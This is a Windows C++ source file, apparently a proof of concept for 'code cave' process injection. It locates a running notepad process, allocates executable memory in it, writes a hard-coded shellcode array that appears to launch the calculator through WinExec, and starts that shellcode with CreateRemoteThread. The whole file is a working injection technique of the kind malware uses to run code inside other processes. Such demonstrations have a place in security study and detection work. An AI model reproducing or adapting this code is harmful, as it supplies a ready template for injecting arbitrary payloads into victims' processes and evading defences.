

#include "pch.h"
#include <iostream>
#include <windows.h>
#include <stdlib.h>
#include <tlhelp32.h>
#include <tchar.h>
#include <string>
#include <shlwapi.h>


using namespace std;


char shellcode[] = "\x6a\x60\x5a\x68\x63\x61\x6c\x63\x54\x59\x48\x29\xd4\x65\x48\x8b\x32\x48\x8b\x76\x18\x48\x8b\x76\x10\x48\xad\x48\x8b\x30\x48\x8b\x7e\x30\x03\x57\x3c\x8b\x5c\x17\x28\x8b\x74\x1f\x20\x48\x01\xfe\x8b\x54\x1f\x24\x0f\xb7\x2c\x17\x8d\x52\x02\xad\x81\x3c\x07\x57\x69\x6e\x45\x75\xef\x8b\x74\x1f\x1c\x48\x01\xfe\x8b\x34\xae\x48\x01\xf7\x99\xff\xd7";


HANDLE FindRunningProcess(LPSTR processName) {
	HANDLE hProcessSnap;
	HANDLE hProcess;
	PROCESSENTRY32 pe32;
	DWORD dwPriorityClass;

	pe32.dwSize = sizeof(PROCESSENTRY32);
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE) {
		//cout << "Failed to create snapshot" << endl;
		return INVALID_HANDLE_VALUE;
	}
	if (!Process32First(hProcessSnap, &pe32)) {
		//cout << "Failed to get first process" << endl;
		CloseHandle(hProcessSnap);
		return INVALID_HANDLE_VALUE;
	}
	do {
		////cout << "Process Id:" << pe32.th32ProcessID << endl;
		cout << "Parent Id:" << pe32.th32ParentProcessID << endl;
		LPSTR buffer = new CHAR[MAX_PATH];
		DWORD value = MAX_PATH;
		hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
		QueryFullProcessImageNameA(hProcess, 0, buffer, &value);
		cout << buffer << endl;;
		if (strstr(buffer, processName)) {
			//cout << "Found a notepad" << endl;
			return hProcess;
		}
		cout << endl;

	} while (Process32Next(hProcessSnap, &pe32));
	return INVALID_HANDLE_VALUE;
}


int main()
{
	/*
	Code Cave Injection
	*/
	cout << "Test!\n";
	char processName[] = "notepad";
	HANDLE p = FindRunningProcess(processName);
	if (p == INVALID_HANDLE_VALUE) {
		cout << "Failed to find notepad" << endl;
	}
	else {
		cout << "Found notepad!" << endl;
	}
	char  mytext[] = "Hello by CodeCave!";
	char mycaption[] = "Injection result";


	LPVOID MyFuncAddress = VirtualAllocEx(p, NULL, 258, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	WriteProcessMemory(p, MyFuncAddress, (void*)shellcode, 258, NULL);

	HANDLE thread = CreateRemoteThread(p, NULL, 0, (LPTHREAD_START_ROUTINE)MyFuncAddress, 0, 0, NULL);

	if (thread != 0) {

		WaitForSingleObject(thread, INFINITE);   //this waits untill thread thread has finished

		CloseHandle(thread);
		CloseHandle(p);  //don't wait for the thread to finish, just close the handle to the process
		cout << "Injection completed!" << endl;
	}
	else {
		cout << "Error!" << endl;
	}


	system("PAUSE");
	return EXIT_SUCCESS;


}




